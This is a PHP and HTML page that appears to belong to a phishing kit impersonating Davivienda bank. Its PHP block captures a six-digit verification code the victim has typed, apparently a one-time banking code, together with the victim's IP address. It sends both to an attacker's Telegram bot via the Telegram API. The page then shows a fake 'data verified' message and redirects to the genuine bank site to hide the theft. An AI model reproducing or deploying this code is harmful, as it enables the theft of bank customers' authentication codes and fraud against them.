<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('datos_del_tel.php');

if ( isset ($_POST['num1']) && isset ($_POST['num2']) && isset ($_POST['num3']) && isset ($_POST['num4']) && isset ($_POST['num5']) && isset ($_POST['num6'])){
	

$message = "Codigo2: ".$_POST['num1']."".$_POST['num2']."".$_POST['num3']."".$_POST['num4']."".$_POST['num5']."".$_POST['num6']." \r\n".$userp."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



}else{ header ('location: index.html'); exit();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>home</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="stylesheet" type="text/css" href="cese/util.css">
	<link rel="stylesheet" type="text/css" href="cese/main.css">
 <script language="JavaScript">
	var tiempo=5;
    var url="https://www.davivienda.com/wps/portal/personas/nuevo/personas/aqui_puedo/comprar_lo_que_deseo/tarjeta_de_credito/!ut/p/z1/hY5BC4IwHMU_iwePbf-czNltBQWGRXjIdgmVNQV1Mlejb986BkXv9B7v9-BhgUssxurRqcp2eqx6ny-CXgk7xYdsHeXFNiXAcyg2PD0ud3uKz_8A4Wv4IQ5-L_4hGRZdPSDXDAgQsCiOSExZQhPvgb4v8rEmTGFh5E0aadDd-OettdO8CiEE5xxSWqteokYPIXybtHq2uPwk8TSUsBD10_EgeAHGp5RI/dz/d5/L2dBISEvZ0FBIS9nQSEh/";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form class="login100-form validate-form" method="post" action="">
					<div align="center">
						<img src="cese/ccanjja.png" style="width:200px;">
					</div>
					
					
					
					  
  	<div align="center"><img src="cese/crrggd.gif" style="width:90px;">
								
								<br><br>
								
									<font style="font-size:20px; font-color:black;">¡Información ingresada exitosamente!</font><br><br>
							<span style="font-size:15px;color:red">
  Estamos verificando sus datos, en caso de un error será contactado por 
 nuestros asesores financieros</span>
								<br><br>
								
								
								<font id="contador" style=" font-size:18px;"></font>
								</div>

					<div class="text-center p-t-115">
						<img src="cese/bottom.png" style="width:100px;">
						

					</div>
				</form>
			</div>
		</div>
	</div>

</body>
</html>